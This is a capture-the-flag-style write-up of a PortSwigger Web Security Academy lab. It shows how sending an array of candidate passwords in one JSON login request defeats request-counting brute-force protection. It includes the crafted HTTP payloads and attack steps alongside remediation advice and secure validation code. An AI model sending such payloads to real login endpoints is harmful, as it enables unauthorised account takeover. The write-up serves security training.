# PortSwigger Expert Lab: Broken Brute-Force Protection — Multiple Credentials per Request

**Author:** Neelesh Pandey  
**Platform:** PortSwigger Web Security Academy  
**Difficulty:** Expert  
**Category:** Authentication / Brute-Force Protection Bypass  
**Lab:** Broken brute-force protection, multiple credentials per request  

---

## Overview

This lab demonstrates a critical logic flaw where a JSON-based login endpoint accepts an **array of passwords** in a single request. Instead of testing one password per request — which would trigger rate limiting — all candidate passwords are submitted simultaneously in one request, completely bypassing brute-force protection.

This is one of the most elegant authentication bypasses — zero automation tools needed, no IP spoofing, no interleaving. A single manually crafted request extracts the password.

---

## The Vulnerability

### Normal Login Request (one password)
```json
{
  "username": "carlos",
  "password": "password123"
}
```

### Exploited Login Request (array of passwords)
```json
{
  "username": "carlos",
  "password": [
    "123456",
    "password",
    "qwerty",
    "letmein",
    ...all candidate passwords...
  ]
}
```

**The flaw:** The server accepts a JSON array for the password field and checks the submitted credentials against each value in the array. If any value matches, authentication succeeds — all in a single HTTP request. Brute-force protection never triggers because only one request was sent.

---

## Why This Works

The application's brute-force protection counts **requests** — not password attempts within a request. Since only one request is sent, the counter never increments past 1 — regardless of how many passwords are tested inside that single request.

```
Rate limit counter after this attack: 1
Passwords tested: 100+
Result: Authenticated as carlos
```

---

## Methodology

```
Identify JSON login → Replace string with array → 
Send single request → HTTP 302 → Load in browser → Account accessed
```

---

## 1. Reconnaissance

### Identify JSON Login Format

Intercepted the `POST /login` request in Burp Proxy. Normal request:

```http
POST /login HTTP/2
Host: <lab-id>.web-security-academy.net
Content-Type: application/json

{"username":"carlos","password":"test"}
```

**Key observation:** Credentials submitted as JSON — not standard `application/x-www-form-urlencoded`. JSON format natively supports arrays, making this attack possible.

---

## 2. Exploitation

### Craft the Array Payload

Sent request to Burp Repeater. Replaced the single password string with a JSON array containing all candidate passwords:

```http
POST /login HTTP/2
Host: <lab-id>.web-security-academy.net
Content-Type: application/json

{
  "username": "carlos",
  "password": [
    "123456",
    "password",
    "12345678",
    "qwerty",
    "123456789",
    "12345",
    "1234",
    "111111",
    "1234567",
    "dragon",
    "123123",
    "baseball",
    "abc123",
    "football",
    "monkey",
    "letmein",
    "shadow",
    "master",
    "666666",
    "qwertyuiop",
    ...all remaining candidate passwords...
  ]
}
```

### Send the Request

Single request sent from Burp Repeater.

**Response: HTTP 302** — redirect to account page — authentication succeeded.

---

## 3. Access Carlos's Account

Right-clicked the request → **Show response in browser** → copied URL → loaded in browser.

Page loaded as carlos — account page accessed — lab solved.

---

## 4. Attack Flow Summary

```
POST /login with JSON format identified
        ↓
Single password string → replaced with array of all candidates
        ↓
One HTTP request sent → server iterates through array
        ↓
Matching password found → HTTP 302 returned
        ↓
Response loaded in browser → logged in as carlos → solved
```

---

## 5. Comparison — Brute-Force Bypass Techniques

| Lab | Technique | Requests Sent | Complexity |
|-----|-----------|--------------|------------|
| IP Block Bypass | Interleave valid credentials every 2 attempts | 100+ | Medium — requires aligned payload lists |
| Timing Enumeration | X-Forwarded-For spoofing + timing analysis | 100+ | Medium — requires Pitchfork setup |
| Multiple Credentials | JSON array in single request | **1** | Low — single manual request |

This is the simplest and fastest of the three authentication bypass techniques — one request, no tools beyond Burp Repeater.

---

## 6. Key Takeaways

- **JSON arrays bypass request-based rate limiting** — protection that counts requests is useless when one request can contain unlimited attempts
- **Content type determines attack surface** — JSON login endpoints have a fundamentally different attack surface to form-encoded endpoints; always check the Content-Type header
- **No automation needed** — this entire attack is a single manually crafted request; no Intruder, no scripts, no extensions required
- **Rate limiting must count attempts not requests** — the server must validate that the password field contains a single scalar value, not a collection
- **Expert doesn't always mean complex** — this Expert lab is simpler than the Practitioner IP block lab; difficulty reflects the subtlety of the flaw, not the complexity of exploitation
- **JSON type validation is a security concern** — accepting an array where a string is expected is a type confusion vulnerability in the authentication logic

---

## 7. Real-World Relevance

This vulnerability appears in:
- APIs that use JSON for authentication and don't validate field types
- Applications built on frameworks that auto-deserialise JSON arrays without type checking
- GraphQL endpoints where mutation arguments may accept arrays
- Mobile app backends where JSON is the standard format

In bug bounty, always test JSON login endpoints by replacing string values with arrays — it takes 30 seconds and can bypass all rate limiting in a single request.

---

## 8. Remediation

| Finding | Risk | Fix |
|---------|------|-----|
| Password field accepts JSON array | Critical | Validate that password field is a string scalar — reject arrays, objects, or any non-string type |
| Rate limiting counts requests not attempts | Critical | Count authentication attempts per credential pair, not per HTTP request |
| No type validation on JSON input | High | Implement strict JSON schema validation — define expected types for all authentication fields |
| Single request bypasses all brute-force protection | Critical | Rate limit at the credential level — flag accounts with multiple failed attempts regardless of request count |

**Secure server-side validation (Node.js example):**
```javascript
app.post('/login', (req, res) => {
  const { username, password } = req.body;

  // Reject if password is not a plain string
  if (typeof password !== 'string') {
    return res.status(400).json({ error: 'Invalid input' });
  }

  // Proceed with authentication
  authenticate(username, password);
});
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Burp Suite Professional | Proxy, request interception |
| Burp Repeater | Single manual crafted request with JSON array payload |

---

## References

- [PortSwigger — Brute-Force Attacks](https://portswigger.net/web-security/authentication/password-based)
- [PortSwigger — Authentication Vulnerabilities](https://portswigger.net/web-security/authentication)
- [OWASP — Testing for Weak Lock Out Mechanism](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism)

---

*Write-up by Neelesh Pandey — [GitHub](https://github.com/Neelesh707) | [LinkedIn](https://www.linkedin.com/in/neelesh-pandey021/)*
